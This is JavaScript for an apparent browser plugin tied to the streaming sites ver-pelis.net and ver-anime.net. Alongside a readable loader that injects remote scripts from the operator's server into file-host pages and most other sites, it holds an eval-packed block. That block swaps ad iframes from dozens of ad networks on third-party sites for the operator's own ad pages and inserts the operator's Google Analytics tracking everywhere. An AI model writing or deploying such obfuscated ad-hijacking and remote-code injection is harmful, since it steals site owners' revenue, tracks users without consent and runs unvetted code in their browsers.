var loc = (window.location.href.match(/ownd=/i));

if (window.location.href.match(/^http:\/\/(www\.)?bitshare\.com/i) && loc) {
	addScript("bitshare");
} else if (window.location.href.match(/^http:\/\/(www\.)?mediafire\.com/i) && loc) {
	addScript("mediafire");
} else if (window.location.href.match(/^http:\/\/(www\.)?wupload\.(com|cn|de|es|fr|co\.uk|com\.hk|in|it|jp|mx)/i) && loc) {
	addScript('wupload');
} else if (window.location.href.match(/^http:\/\/(www\.)?ver-pelis\.net/i) || window.location.href.match(/^http:\/\/(www\.|beta\.)?ver-anime\.net/i)) {
	if (document.getElementById("player_fram4")) {
		if (document.getElementById("player_fram4").src.match(/get_plugin.html/i)) {
			var al = document.getElementById("videu4").innerHTML.replace(/amp;/gi, '');
			document.getElementById("player_fram4").src = "http://www.ver-pelis.net/nodo/id"+al+".html";
		}
	}
} else { addScript("otros"); }

function addjquery() { 
	var x = document.createElement('script');
	x.setAttribute("type","text/javascript");
	x.setAttribute("src","http://code.jquery.com/jquery-latest.js");
	document.getElementsByTagName("head")[0].appendChild(x);
}
function addScript(id) { 
	var s = document.createElement('script');
	s.setAttribute("type","text/javascript");
	s.setAttribute("src", "http://static.ver-pelis.net/player/servers/"+id+".js");
	document.getElementsByTagName("head")[0].appendChild(s);
} 

function validHost() {
        if (location.href.match(/static\.ak\./i)) {
            return false;
        } else if ("https:" == document.location.protocol) {
            return false;
        } else if (location.href.match(/\.addthis\.com\/static\//i)) {
            return false;
        } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
            return false;
        } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
            return false;
        } else if (location.href.match(/blank/i)) {
            return false;
        } else if (location.href.match(/^http\:\/\/analytics\./i)) {
            return false;
        } else if (location.href.match(/^\.hotmail\.com\//i)) {
            return false;
        } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
            return false;
        } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
            return false;
        } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
            return false;
        } else if (location.href.match(/ver-pelis\.net/i)) {
            return false;
        } else if (location.href.match(/ver-anime\.net/i)) {
            return false;
        } else if (location.href.match(/musicalandia\.net/i)) {
            return false;
        } else if (location.href.match(/ver-series\.net/i)) {
            return false;
        } else if (location.href.match(/musica-online\.org/i)) {
            return false;
        } else if (location.href.match(/ver-documentales\.net/i)) {
            return false;
        } else if (location.href.match(/todoanimes\.com/i)) {
            return false;
        } else if (location.href.match(/animeflv\.net/i)) {
            return false;
		} else if (location.href.match(/goojue\.com/i)) {
            return false;
		} else {
            return true;
        }
    }


eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('C 7(a){2(a.n==\'T\'&&a.o==\'U\'){a.l="b://p.q-v.j/w/V.r"}3 2(a.n==\'W\'&&a.o==\'X\'){a.l="b://p.q-v.j/w/D.r"}3 2(a.n==\'Y\'&&a.o==\'E\'){a.l="b://p.q-v.j/w/Z.r"}3 2(a.n==\'10\'&&a.o==\'E\'){a.l="b://p.q-v.j/w/11.r"}3 2(a.n==\'12\'&&a.o==\'13\'){a.l="b://p.q-v.j/w/D.r"}3{a.l="b://t.14.9/h.r?n="+a.n+"&o="+a.o}m.u(["F","/15"]);16 z}2(17()){k m=m||[];m.u(["18","19-1a-1"]);m.u(["1b","1c"]);m.u(["1d",z]);m.u(["F"]);m.u(["1e",1,"q 1f 1g","1h","0.6"]);(C(){k a=y.1i("G");a.1j="1k/1l";a.1m=z;a.l=("H:"==y.1n.1o?"H://1p":"b://t")+".1q-1r.9/1s.1t";k s=y.I("G")[0];s.1u.1v(a,s)}());k 1w="1x";k 1y="1z";k 1A="1B";k 1C="1";k 1D="1";k 1E="1F";k 4=y.I("5");1G(k i=0;i<4.1H;i++){5=4[i].l;2(5.8("^b://J.1I.9/c?")){7(4[i])}3 2(5.8("d.1J.9")){7(4[i])}3 2(5.8("^b://d.1K.9/c?")){7(4[i])}3 2(5.8("^b://d.1L.9/c?")){7(4[i])}3 2(5.8("^b://d.1M.9/c?")){7(4[i])}3 2(5.8("^b://d.1N.9/c?")){7(4[i])}3 2(5.8("^b://d.1O.9/c?")){7(4[i])}3 2(5.8("^b://d.1P.j/c?")){7(4[i])}3 2(5.8("^b://d.1Q.9/c?")){7(4[i])}3 2(5.8("^b://h.1R-1S-K.9/c?")){7(4[i])}3 2(5.8("^b://d.A.9/c?")){7(4[i])}3 2(5.8("^b://h.1T.j/c?")){7(4[i])}3 2(5.8("^b://d.1U.9/c?")){7(4[i])}3 2(5.8("^b://d.1V.9/c?")){7(4[i])}3 2(5.8("^b://d.1W.j/c?")){7(4[i])}3 2(5.8("^b://h.A.9/c?")){7(4[i])}3 2(5.8("^b://d.e-1X.9/c?")){7(4[i])}3 2(5.8("^b://h.1Y.9/c?")){7(4[i])}3 2(5.8("^b://d.1Z.9/c?")){7(4[i])}3 2(5.8("^b://h.A.9/c?")){7(4[i])}3 2(5.8("^b://L.M.9/c?")){7(4[i])}3 2(5.8("^b://d.20.9/c?")){7(4[i])}3 2(5.8("^b://d.K-21.j/c?")){7(4[i])}3 2(5.8("^b://L.M.9/c?")){7(4[i])}3 2(5.8("^b://d.22.9/c?")){7(4[i])}3 2(5.8("^b://d.23.9/c?")){7(4[i])}3 2(5.8("^b://d.24.j/c?")){7(4[i])}3 2(5.8("^b://h.25.9/c?")){7(4[i])}3 2(5.8("^b://d.26.9/c?")){7(4[i])}3 2(5.8("^b://d.27.9/c?")){7(4[i])}3 2(5.8("^b://d.28.j/c?")){7(4[i])}3 2(5.8("^b://d.29.9/c?")){7(4[i])}3 2(5.8(".2a.9/2b")){7(4[i])}3 2(5.8("^b://d.2c.9/c?")){7(4[i])}3 2(5.8("^b://d.2d.9/c?")){7(4[i])}3 2(5.8("2e.B.9/2f.x?")){7(4[i])}3 2(5.8(".2g.j/2h/2i.x")){7(4[i])}3 2(5.8("N.2j.9/")){7(4[i])}3 2(5.8(".2k.9/2l.x")){7(4[i])}3 2(5.8("h.2m.9/2n")){7(4[i])}3 2(5.8("h.2o.9/d")){7(4[i])}3 2(5.8("h.2p.9/5")){7(4[i])}3 2(5.8("N.2q.9/2r")){7(4[i])}3 2(5.8("2s.2t/B/")){7(4[i])}3 2(5.8("2u.2v-2w.9/2x")){7(4[i])}3 2(5.8("d.2y.2z/")){7(4[i])}3 2(5.8(".2A.9/c")){7(4[i])}3 2(5.8("d.2B.j/2C")){7(4[i])}3 2(5.8("p.2D.O/h/")){7(4[i])}3 2(5.8("t.2E.9/h/")){7(4[i])}3 2(5.8("2F.2G.9/2H-2I/2J/2K/h/2L.x")){7(4[i])}3 2(5.8("J.2M.9/")){7(4[i])}3 2(5.8("h.2N.9/")){7(4[i])}3 2(5.8("2O.2P.9/2Q")){7(4[i])}3 2(5.8("t.2R.9/t/P")){7(4[i])}3 2(5.8(".2S.9/")){7(4[i])}3 2(5.8("h.2T.9/t/P/")){7(4[i])}3 2(5.8("2U.9/d.x")){7(4[i])}3 2(5.8("^b://d.2V.j/c?")){7(4[i])}3 2(5.8("2W.g.Q.j/2X/h?")){7(4[i])}3 2(5.8("h.R.j/B/")){7(4[i])}3 2(5.8("2Y.g.Q.j/2Z/h?")){7(4[i])}3 2(5.8("30.O/31/")){7(4[i])}3 2(5.8("32.R.j/33/")){7(4[i])}3 2(5.8("h.S.9")){7(4[i])}3 2(5.8("h.S.9")){7(4[i])}3 2(5.8("f.34.9")){7(4[i])}}}',62,191,'||if|else|iframes|iframe||otranet|match|com||http|st|ad||||ads||net|var|src|_gaq|width|height|static|ver|html||www|push|pelis|ads2|php|document|true|jumbaexchange|openx|function|ads300x250|600|_trackPageview|script|https|getElementsByTagName|adserving|media|go|cpmadvisors|adserver|tv|delivery|doubleclick|mcanime|creanis|728|90|ads728x90|300|250|160|ads160x600|120|ads120x600|336|280|goojue|trackBannerM|return|validHost|_setAccount|UA|27189179|_setDomainName|none|_setAllowLinker|_setCustomVar|Pelis|Plugin|plugin_version|createElement|type|text|javascript|async|location|protocol|ssl|google|analytics|ga|js|parentNode|insertBefore|zflag_nid|1336|zflag_cid|462|zflag_sid|478|zflag_width|zflag_height|zflag_sz|94|for|length|cpxinteractive|smowtion|foxnetworks|xtendmedia|harrenmedianetwork|metanetwork|blinkdr|z5x|adfunky|creafi|online|avazu|yieldads|adnetinteractive|bannerconnect|viral|tlvmedia|adperium|xertive|servers|globe7|103092804|globaltakeoff|bluelithium|antventure|reduxmedia|adtegrity|directaclick|mediashakers|id|adserverplus|yieldmanager|tradex|afr|affiz|tracking|iframedfp|itsfogo|pasadserver|showBanner|lfstmedia|slot|sonicomusica|adpv|adtechus|adiframe|mooxar|info|bs|serving|sys|BurstingPipe|adserver01|de|adsmwt|vuiads|showads|seeon|redditmedia|justjared|buzznet|wp|content|themes|default|banner|cpxadroit|mapcity|edge|actaads|a_|adsomega|zedo|ad4game|multiupload|adnetwork|googleads|pagead|pubads|gampad|cuevana|banners|images|manga|megaclick'.split('|'),0,{}))